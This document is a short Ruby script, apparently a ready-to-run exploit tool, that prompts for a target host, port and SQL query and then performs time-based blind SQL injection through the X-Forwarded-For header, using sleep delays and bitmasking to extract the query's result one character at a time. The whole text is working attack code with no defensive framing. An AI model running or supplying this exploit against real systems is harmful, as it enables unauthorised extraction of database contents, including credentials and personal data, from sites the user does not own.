require 'socket'
line = "================================================="

puts line
puts "0x90 Blind SQL injection in X-Forwarded-For header"
puts line
puts "What is the targets IP adress or base DNS? "
target = $stdin.gets.chomp
puts "On what port is the target listening? "
port = $stdin.gets.chomp
puts "what SQL command would you like to inject? "
inj = $stdin.gets.chomp
puts line

puts "Starting Bitmasked Blind Timebased SQLi in X-Forwarded-For header of #{target} on port #{port}"
puts line


str = ""
 
def test(sql,target,port)
  p = "testing' or if((#{sql}),sleep(0.4),0) and '1'='1"
  t = Time.now
  begin
    s = TCPSocket.new("#{target}",port)
    s.write("GET / HTTP/1.1\r\nHost: vulnerable\r\nX-Forwarded-For: #{p}\r\nConnection: close\r\n\r\n")
    s.readlines()
    s.close
  rescue Errno::ECONNRESET, EOFError
  end
  return ((Time.now-t)>0.5)
end

value = 1
i = 0

while value != 0
  i+=1
  value = 0
  0.upto(6) do |bit|
    sql = "select ascii(substring((#{inj}),#{i},1))&#{2**bit}"
    if test(sql, target, port)
      value+=2**bit
    end
  end
  str+= value.chr
  puts str
end
